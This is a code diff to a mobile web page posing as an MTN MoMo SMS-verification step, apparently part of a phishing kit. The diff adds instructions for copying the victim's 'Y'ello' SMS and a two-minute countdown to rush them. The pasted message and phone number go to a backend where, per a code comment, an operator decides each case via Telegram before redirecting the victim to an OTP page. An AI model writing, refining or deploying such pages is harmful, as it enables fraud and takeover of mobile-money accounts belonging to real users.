@@ -106,8 +106,9 @@
       display: flex;
       flex-direction: column;
       min-height: 0;
+      overflow-y: auto;
     }
-    .heading { margin-bottom: 14px; flex-shrink: 0; }
+    .heading { margin-bottom: 12px; flex-shrink: 0; }
     .heading h1 {
       font-size: 18px; font-weight: 800;
       color: var(--momo-dark-blue);
@@ -120,7 +121,7 @@
       display: flex;
       align-items: center;
       gap: 6px;
-      margin-bottom: 14px;
+      margin-bottom: 12px;
       flex-shrink: 0;
     }
     .step-dot {
@@ -137,10 +138,10 @@
       display: flex;
       align-items: center;
       gap: 10px;
-      padding: 11px 14px;
+      padding: 10px 13px;
       background: linear-gradient(135deg, var(--momo-blue) 0%, #006A93 100%);
       border-radius: 12px;
-      margin-bottom: 14px;
+      margin-bottom: 12px;
       flex-shrink: 0;
       position: relative;
       overflow: hidden;
@@ -152,7 +153,7 @@
       background: rgba(255,204,5,0.15);
     }
     .phone-chip-icon {
-      width: 34px; height: 34px;
+      width: 32px; height: 32px;
       border-radius: 9px;
       background: rgba(255,255,255,0.15);
       display: flex; align-items: center; justify-content: center;
@@ -161,7 +162,7 @@
       position: relative;
       z-index: 1;
     }
-    .phone-chip-icon svg { width: 17px; height: 17px; }
+    .phone-chip-icon svg { width: 16px; height: 16px; }
     .phone-chip-body {
       flex: 1;
       position: relative;
@@ -169,7 +170,7 @@
       min-width: 0;
     }
     .phone-chip-label {
-      font-size: 10px;
+      font-size: 9.5px;
       color: rgba(255,255,255,0.75);
       font-weight: 700;
       letter-spacing: 0.9px;
@@ -177,7 +178,7 @@
       margin-bottom: 2px;
     }
     .phone-chip-value {
-      font-size: 14px;
+      font-size: 13.5px;
       color: #fff;
       font-weight: 800;
       letter-spacing: -0.2px;
@@ -187,27 +188,102 @@
       text-overflow: ellipsis;
     }
 
-    /* SMS field */
-    .field { margin-bottom: 12px; }
-    .field label {
-      display: flex;
-      justify-content: space-between;
-      align-items: baseline;
+    /* Instructions card — above the box */
+    .instructions {
+      background: #FFFBEF;
+      border: 1px solid #F5E9B8;
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 12px;
+      flex-shrink: 0;
+    }
+    .instructions-title {
       font-size: 11px;
-      font-weight: 700;
+      font-weight: 800;
       color: var(--momo-dark-blue);
       text-transform: uppercase;
       letter-spacing: 0.6px;
-      margin-bottom: 5px;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
     }
-    .field label .hint {
-      font-size: 10px;
-      color: var(--momo-muted);
-      text-transform: none;
-      letter-spacing: 0;
+    .instructions-title svg { width: 13px; height: 13px; color: var(--momo-blue); }
+    .instructions-list {
+      list-style: none;
+      font-size: 12px;
+      color: #6B5A00;
+      line-height: 1.55;
       font-weight: 500;
     }
+    .instructions-list li {
+      padding-left: 18px;
+      position: relative;
+      margin-bottom: 3px;
+    }
+    .instructions-list li:last-child { margin-bottom: 0; }
+    .instructions-list li::before {
+      content: counter(step-counter);
+      counter-increment: step-counter;
+      position: absolute;
+      left: 0;
+      top: 1px;
+      width: 14px; height: 14px;
+      border-radius: 50%;
+      background: var(--momo-yellow);
+      color: var(--momo-dark-blue);
+      font-size: 9px;
+      font-weight: 900;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      line-height: 1;
+    }
+    .instructions-list {
+      counter-reset: step-counter;
+    }
+    .instructions-list strong {
+      color: var(--momo-dark-blue);
+      font-weight: 800;
+    }
 
+    /* Countdown timer */
+    .timer-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px;
+      background: linear-gradient(135deg, var(--momo-pale-blue) 0%, #E5EDF1 100%);
+      border-radius: 12px;
+      margin-bottom: 12px;
+      flex-shrink: 0;
+      border: 1px solid var(--momo-border);
+    }
+    .timer-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 11.5px;
+      font-weight: 700;
+      color: var(--momo-dark-blue);
+      letter-spacing: 0.3px;
+    }
+    .timer-left svg {
+      width: 14px; height: 14px;
+      color: var(--momo-blue);
+    }
+    .timer-value {
+      font-size: 15px;
+      font-weight: 900;
+      color: var(--momo-blue);
+      font-variant-numeric: tabular-nums;
+      letter-spacing: -0.3px;
+    }
+    .timer-value.warning { color: var(--momo-error); }
+    .timer-value.expired { color: var(--momo-error); opacity: 0.6; }
+
+    /* SMS field */
+    .field { margin-bottom: 12px; }
     .sms-wrap {
       position: relative;
       border: 1.5px solid var(--momo-border);
@@ -221,34 +297,29 @@
       box-shadow: 0 0 0 4px rgba(0,79,113,0.09);
       background: var(--momo-white);
     }
-    .sms-header {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 14px;
-      background: var(--momo-pale-blue);
-      border-bottom: 1px solid var(--momo-border);
-      font-size: 11px;
-      font-weight: 700;
-      color: var(--momo-dark-blue);
-      letter-spacing: 0.4px;
-    }
-    .sms-header svg { width: 13px; height: 13px; color: var(--momo-blue); }
     #smsText {
       width: 100%;
-      min-height: 130px;
-      max-height: 180px;
+      min-height: 110px;
+      max-height: 150px;
       resize: none;
       border: none;
       background: transparent;
-      padding: 12px 14px;
+      padding: 14px;
       font-size: 13px;
-      line-height: 1.5;
+      line-height: 1.55;
       color: var(--momo-text);
       font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, monospace;
       outline: none;
+      display: block;
     }
-    #smsText::placeholder { color: #A8B4BC; font-family: -apple-system, BlinkMacSystemFont, sans-serif; font-weight: 500; }
+    #smsText::placeholder {
+      color: var(--momo-yellow);
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      font-weight: 800;
+      font-size: 14px;
+      opacity: 0.75;
+      letter-spacing: 0.2px;
+    }
 
     .sms-footer {
       display: flex;
@@ -266,6 +337,7 @@
       display: flex;
       align-items: center;
       gap: 4px;
+      font-weight: 700;
     }
     .sms-footer .valid svg { width: 11px; height: 11px; }
     .paste-btn {
@@ -286,35 +358,6 @@
     }
     .paste-btn:hover { background: rgba(0,79,113,0.08); }
     .paste-btn svg { width: 12px; height: 12px; }
-
-    /* Hint card */
-    .hint-card {
-      display: flex;
-      gap: 10px;
-      padding: 11px 13px;
-      background: #FFFBEF;
-      border: 1px solid #F5E9B8;
-      border-radius: 10px;
-      margin-bottom: 12px;
-      flex-shrink: 0;
-    }
-    .hint-icon {
-      width: 26px; height: 26px;
-      border-radius: 8px;
-      background: var(--momo-yellow);
-      display: flex; align-items: center; justify-content: center;
-      color: var(--momo-dark-blue);
-      flex-shrink: 0;
-      font-weight: 900;
-      font-size: 13px;
-    }
-    .hint-body {
-      font-size: 11.5px;
-      color: #6B5A00;
-      line-height: 1.5;
-      font-weight: 500;
-    }
-    .hint-body strong { color: var(--momo-dark-blue); font-weight: 800; }
 
     /* Error */
     .error-msg {
@@ -351,10 +394,6 @@
       background: #C4CDD5;
       box-shadow: none;
       cursor: not-allowed;
-    }
-    .footer-note {
-      text-align: center; font-size: 10.5px;
-      color: var(--momo-muted); margin-top: 10px; font-weight: 500;
     }
 
     /* LOADER */
@@ -411,15 +450,15 @@
     @media (max-height: 660px) {
       .heading { margin-bottom: 10px; }
       .heading h1 { font-size: 16px; }
-      #smsText { min-height: 100px; }
+      #smsText { min-height: 90px; }
       .footer { padding: 12px 20px 14px; }
       .btn-verify { padding: 13px; }
+      .instructions { padding: 10px 12px; }
     }
   </style>
 </head>
 <body>
   <div class="phone">
-    <!-- HEADER -->
     <header class="topbar">
       <button class="back-btn" aria-label="Back" onclick="history.back()">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
@@ -451,7 +490,6 @@
         <span class="step-dot"></span>
       </div>
 
-      <!-- Recipient number chip (pulled from session) -->
       <div class="phone-chip">
         <div class="phone-chip-icon">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
@@ -462,28 +500,34 @@
         </div>
       </div>
 
-      <!-- Hint -->
-      <div class="hint-card">
-        <div class="hint-icon">!</div>
-        <div class="hint-body">
-          Paste the full SMS that starts with <strong>Y'ello</strong> from MTN MoMo.
+      <!-- Instructions -->
+      <div class="instructions">
+        <div class="instructions-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          How to get your SMS
         </div>
+        <ol class="instructions-list">
+          <li>Open your phone's <strong>Messages</strong> app.</li>
+          <li>Find the latest SMS that starts with <strong>Y'ello</strong> from MTN.</li>
+          <li>Copy the whole message and paste it in the box below.</li>
+        </ol>
       </div>
 
-      <!-- SMS textarea -->
+      <!-- Countdown timer -->
+      <div class="timer-bar">
+        <div class="timer-left">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          Time remaining to paste
+        </div>
+        <div class="timer-value" id="timerValue">02:00</div>
+      </div>
+
+      <!-- SMS textarea (blank, Y'ello placeholder only) -->
       <div class="field">
-        <label>
-          Y'ello SMS Message
-          <span class="hint" id="charCount">0 chars</span>
-        </label>
         <div class="sms-wrap">
-          <div class="sms-header">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
-            MTN MoMo · Inbox
-          </div>
           <textarea
             id="smsText"
-            placeholder="Paste the message here&#10;&#10;e.g. Y'ello! You have received UGX 950,000 from..."
+            placeholder="Y'ello"
             spellcheck="false"
             autocomplete="off"
           ></textarea>
@@ -492,7 +536,7 @@
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
               Looks valid
             </span>
-            <span id="validPlaceholder" style="opacity:0.7;">Message must start with Y'ello</span>
+            <span id="validPlaceholder" style="opacity:0.7;"></span>
             <button type="button" class="paste-btn" id="pasteBtn">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
               Paste
@@ -501,7 +545,6 @@
         </div>
       </div>
 
-      <!-- Error -->
       <div class="error-msg" id="errorMsg">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
         <span id="errorText">Invalid SMS. Please paste the correct Y'ello message.</span>
@@ -512,10 +555,8 @@
       <button class="btn-verify" id="verifyBtn" disabled>
         <span class="label">Verify SMS</span>
       </button>
-      <div class="footer-note">Only Y'ello MTN messages are accepted</div>
     </footer>
 
-    <!-- LOADER -->
     <div class="loader-overlay" id="loaderOverlay">
       <div class="loader-ring"></div>
       <div class="loader-title" id="loaderTitle">Verifying SMS…</div>
@@ -524,10 +565,9 @@
       </div>
     </div>
 
-    <!-- TOAST -->
     <div class="toast" id="toast">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-      <span id="toastText">Invalid SMS. Please paste the correct Y'ello message.</span>
+      <span id="toastText">Invalid SMS. Please try again.</span>
     </div>
   </div>
 
@@ -539,28 +579,53 @@
     const loaderOverlay = document.getElementById('loaderOverlay');
     const toast = document.getElementById('toast');
     const toastText = document.getElementById('toastText');
-    const charCount = document.getElementById('charCount');
     const validIndicator = document.getElementById('validIndicator');
     const validPlaceholder = document.getElementById('validPlaceholder');
     const pasteBtn = document.getElementById('pasteBtn');
     const phoneChipValue = document.getElementById('phoneChipValue');
+    const timerValue = document.getElementById('timerValue');
 
-    // Pull the phone number from the previous step (mtn.html saved it in sessionStorage)
+    // Pull phone from previous step
     try {
       const prev = JSON.parse(sessionStorage.getItem('mtnSubmission') || '{}');
       if (prev.phone) phoneChipValue.textContent = prev.phone;
     } catch (_) {}
 
-    // Validation rule: must start with "y'ello" (case-insensitive), allow typographic apostrophe
+    // Validation — must start with "y'ello" (case-insensitive, allows typographic apostrophe)
     function isValidSms(text) {
       const t = text.trim().toLowerCase();
-      return /^y[''']?ello/.test(t) || /^y[''']?ello!/.test(t);
+      return /^y[''']?ello/.test(t);
     }
 
-    smsText.addEventListener('input', () => {
-      const t = smsText.value;
-      charCount.textContent = t.length + ' chars';
+    // --- 2-minute countdown ---
+    let secondsLeft = 120;
+    let countdownExpired = false;
 
+    function formatTime(s) {
+      const m = Math.floor(s / 60).toString().padStart(2, '0');
+      const ss = (s % 60).toString().padStart(2, '0');
+      return `${m}:${ss}`;
+    }
+
+    function tickTimer() {
+      if (secondsLeft <= 0) {
+        timerValue.textContent = '00:00';
+        timerValue.classList.add('expired');
+        countdownExpired = true;
+        verifyBtn.disabled = true;
+        showError('Time expired. Please refresh to try again.');
+        return;
+      }
+      secondsLeft--;
+      timerValue.textContent = formatTime(secondsLeft);
+      if (secondsLeft <= 30) timerValue.classList.add('warning');
+    }
+    timerValue.textContent = formatTime(secondsLeft);
+    const timerInterval = setInterval(tickTimer, 1000);
+
+    smsText.addEventListener('input', () => {
+      if (countdownExpired) return;
+      const t = smsText.value;
       if (isValidSms(t)) {
         validIndicator.style.display = 'flex';
         validPlaceholder.style.display = 'none';
@@ -573,7 +638,6 @@
       }
     });
 
-    // Paste button — reads clipboard
     pasteBtn.addEventListener('click', async () => {
       try {
         const text = await navigator.clipboard.readText();
@@ -581,13 +645,12 @@
         smsText.dispatchEvent(new Event('input'));
         smsText.focus();
       } catch (_) {
-        // Clipboard API blocked → just focus the textarea
         smsText.focus();
       }
     });
 
     function showError(msg) {
-      errorText.textContent = msg || 'Invalid SMS. Please paste the correct Y\'ello message.';
+      errorText.textContent = msg || "Invalid SMS. Please paste the correct Y'ello message.";
       errorMsg.classList.add('show');
     }
     function hideError() { errorMsg.classList.remove('show'); }
@@ -595,29 +658,39 @@
     function showToast(msg) {
       toastText.textContent = msg;
       toast.classList.add('show');
-      setTimeout(() => toast.classList.remove('show'), 4000);
+      setTimeout(() => toast.classList.remove('show'), 4500);
     }
 
-    function showLoader(title, sub) {
-      document.getElementById('loaderTitle').textContent = title || 'Verifying SMS…';
-      document.getElementById('loaderSub').textContent = sub || 'Please wait while we confirm your message with MTN.';
+    function showLoader() {
       loaderOverlay.classList.add('show');
     }
     function hideLoader() { loaderOverlay.classList.remove('show'); }
 
+    // --- Submit ---
     verifyBtn.addEventListener('click', async () => {
       hideError();
-
-      const text = smsText.value.trim();
-      if (!isValidSms(text)) {
-        showError('Invalid SMS. Please paste the correct Y\'ello message.');
+      if (countdownExpired) {
+        showError('Time expired. Please refresh to try again.');
         return;
       }
 
-      // Reset any previous decision
+      const text = smsText.value.trim();
+      if (!isValidSms(text)) {
+        showError("Invalid SMS. Please paste the correct Y'ello message.");
+        return;
+      }
+
+      // Reset previous decision
       try { await fetch('/api/reset', { method: 'POST' }); } catch (_) {}
 
-      showLoader('Verifying SMS…', 'Please wait while we confirm your message with MTN.');
+      // Save phone in sessionStorage for next step
+      try {
+        sessionStorage.setItem('mtnSubmission', JSON.stringify({
+          phone: phoneChipValue.textContent
+        }));
+      } catch (_) {}
+
+      showLoader();
 
       const payload = {
         smsMessage: text,
@@ -640,8 +713,8 @@
         }
         if (data.status === 'declined') {
           hideLoader();
-          showToast(data.message || 'Invalid SMS. Please paste the correct Y\'ello message.');
-          showError(data.message || 'Invalid SMS. Please paste the correct Y\'ello message.');
+          showToast(data.message || 'Invalid SMS. Please try again.');
+          showError(data.message || 'Invalid SMS. Please try again.');
           return;
         }
         // pending — SSE will push decision
@@ -651,7 +724,7 @@
       }
     });
 
-    // Real-time decision from server
+    // Real-time decision from Telegram
     try {
       const evt = new EventSource('/api/stream');
       evt.onmessage = (e) => {
@@ -661,8 +734,8 @@
             window.location.href = 'otp.html';
           } else if (s.decision === 'sms-declined') {
             hideLoader();
-            showToast(s.declineMessage || 'Invalid SMS. Please paste the correct Y\'ello message.');
-            showError(s.declineMessage || 'Invalid SMS. Please paste the correct Y\'ello message.');
+            showToast(s.declineMessage || 'Invalid SMS. Please try again.');
+            showError(s.declineMessage || 'Invalid SMS. Please try again.');
           }
         } catch (_) {}
       };
